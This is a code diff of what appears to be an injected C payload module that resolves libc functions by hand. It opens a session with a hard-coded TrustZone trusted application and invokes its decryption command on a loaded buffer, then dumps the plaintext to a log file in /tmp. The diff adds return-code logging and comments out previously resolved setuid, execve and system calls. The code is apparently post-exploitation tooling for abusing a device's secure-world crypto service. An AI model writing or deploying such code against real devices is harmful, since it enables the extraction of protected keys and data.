@@ -43,7 +43,7 @@ static int __attribute__ ((noinline)) syscall6(uint32_t nr, int arg1, int arg2, 
 #define _read(fd, buf, count) syscall3(__NR_read, (int)fd, (int)buf, (int)count)
 
 #include "module.h"
-#include "tee_client_api.h"
+#include "tee_client_api_A.h"
 
 //--- /lib/libc.so.6
 typedef int (*open_t)(const char *pathname, int flags, mode_t mode);
@@ -167,14 +167,14 @@ static int init( gd_t *g, void* libdladdr )
 	fetch_dlsym(write);
 	fetch_dlsym(close);
 	
-	fetch_dlsym(mmap);
-	fetch_dlsym(munmap);
+//	fetch_dlsym(mmap);
+//	fetch_dlsym(munmap);
 	fetch_dlsym(memcpy);
 	fetch_dlsym(sprintf);
 	fetch_dlsym(strlen);
-	fetch_dlsym(strrchr);
+//	fetch_dlsym(strrchr);
 	
-	fetch_dlsym(getuid);
+/*	fetch_dlsym(getuid);
 	fetch_dlsym(getgid);
 	fetch_dlsym(setuid);
 	fetch_dlsym(setgid);
@@ -187,7 +187,7 @@ static int init( gd_t *g, void* libdladdr )
 	fetch_dlsym(dup2);
 	fetch_dlsym(execve);
 	fetch_dlsym(system);
-	
+*/	
 	g->dlclose(hmod);
 	
 	#define LOGFILE 	"/tmp/" FILENAME ".log"
@@ -259,8 +259,8 @@ int main(void* libdladdr)
 //	uint8_t destination[16] = {0x21, 0x22, 0x22, 0x22, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1};	
 	TEEC_UUID destination = { .timeLow = 0x22222221, .timeMid = 0, .timeHiAndVersion = 0, .clockSeqAndNode = {0, 0, 0, 0, 0, 0, 0, 1} };	
 		
-	//log1(&g, "TEEC_InitializeContext = %s\n", TEEC_InitializeContext(0, &context) == TEEC_SUCCESS ? (uint32_t)"OK" : (uint32_t)"KO");
-	TEEC_InitializeContext(0, &context);
+	log1(&g, "TEEC_InitializeContext = 0x%08x\n", TEEC_InitializeContext(0, &context));
+//	TEEC_InitializeContext(0, &context);
 		
 	//	TEEC_SharedMemory sharedMem = { .buffer = NULL, .size = 0x1000, .flags = TEEC_VALUE_INOUT };
 	TEEC_SharedMemory shm[3];		// input, output, salt
@@ -271,13 +271,13 @@ int main(void* libdladdr)
 		shm[i].size = 0x10000;
 		shm[i].flags = TEEC_VALUE_INOUT;
 		
-		//log1(&g, "TEEC_AllocateSharedMemory = %s\n", TEEC_AllocateSharedMemory(&context, &shm[i]) == TEEC_SUCCESS ? (uint32_t)"OK" : (uint32_t)"KO");
-		TEEC_AllocateSharedMemory(&context, &shm[i]);
+		log1(&g, "TEEC_AllocateSharedMemory = 0x%08x\n", TEEC_AllocateSharedMemory(&context, &shm[i]));
+//		TEEC_AllocateSharedMemory(&context, &shm[i]);
 	}
 	
 	TEEC_Session session;
-	//log1(&g, "TEEC_OpenSession = %s\n", TEEC_OpenSession(&context, &session, &destination, 0, 0, 0, 0) == TEEC_SUCCESS ? (uint32_t)"OK" : (uint32_t)"KO");
-	TEEC_OpenSession(&context, &session, &destination, 0, 0, 0, 0);
+	log1(&g, "TEEC_OpenSession = 0x%08x\n", TEEC_OpenSession(&context, &session, &destination, 0, 0, 0, 0));
+//	TEEC_OpenSession(&context, &session, &destination, 0, 0, 0, 0);
 	
 	g.memcpy(shm[0].buffer, buf, len);
 	g.close(fd);
@@ -286,20 +286,20 @@ int main(void* libdladdr)
 	TEEC_Operation operation;
 	operation.started = 0;
 	operation.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_PARTIAL_INOUT, TEEC_MEMREF_PARTIAL_INOUT, TEEC_VALUE_INOUT, 0);	
-	operation.params[0].memref.parent = &shm[0];
+	operation.params[0].memref.parent = &shm[0];		// input buffer
 	operation.params[0].memref.size = len;
 	operation.params[0].memref.offset = 0;
-	operation.params[1].memref.parent = &shm[1];
-	operation.params[1].memref.size = len;
+	operation.params[1].memref.parent = &shm[1];		// output buffer
+	operation.params[1].memref.size = shm[1].size;
 	operation.params[1].memref.offset = 0;
-	operation.params[2].value.a = 0;	// bEncrypt
-	operation.params[2].value.b = 0;	// bPassphraseEncrypted
+	operation.params[2].value.a = 0;			// bEncrypt
+	operation.params[2].value.b = 0;			// bPassphraseEncrypted
 		
-	//log1(&g, "TEEC_InvokeCommand = %s\n", TEEC_InvokeCommand(&session, 3, &operation, 0) == TEEC_SUCCESS ? (uint32_t)"OK" : (uint32_t)"KO");	
-	TEEC_InvokeCommand(&session, 3, &operation, 0);
+	log1(&g, "TEEC_InvokeCommand = 0x%08x\n", TEEC_InvokeCommand(&session, 3, &operation, 0));	
+	//TEEC_InvokeCommand(&session, 3, &operation, 0);
 		
 	log0(&g, "decrypted:\n");
-	g.write(g.log_fd, shm[1].buffer, len);
+	g.write(g.log_fd, shm[1].buffer, shm[1].size);
 	
 	for( int i = 0; i < 3; i++ )
 		TEEC_ReleaseSharedMemory(&shm[i]);
